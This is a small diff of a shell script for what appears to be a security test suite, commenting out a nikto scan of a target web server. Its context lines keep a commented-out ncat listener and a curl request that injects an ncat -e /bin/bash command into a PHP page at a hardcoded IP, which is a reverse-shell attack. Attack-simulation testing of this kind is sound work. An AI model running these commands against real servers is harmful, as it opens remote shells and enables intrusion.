@@ -112,8 +112,8 @@ echo '* Test #7 - scan webserver for vulnerabilities                        *'
 echo '* This will be used to find a vulnerable server for php attack        *'
 echo '***********************************************************************'
 echo
-echo "scan webserver for vulnerabilities"
-nikto -h $BASIC_LINUX_TARGET
+#echo "scan webserver for vulnerabilities"
+#nikto -h $BASIC_LINUX_TARGET
 # ncat -v -n -l -p 6666 &
 # curl http://54.210.117.54/index.php?cmd=ncat%20$BASIC_LINUX_TARGET%206666%20-e%20/bin/bash
 echo '*****************************************************************************************************'
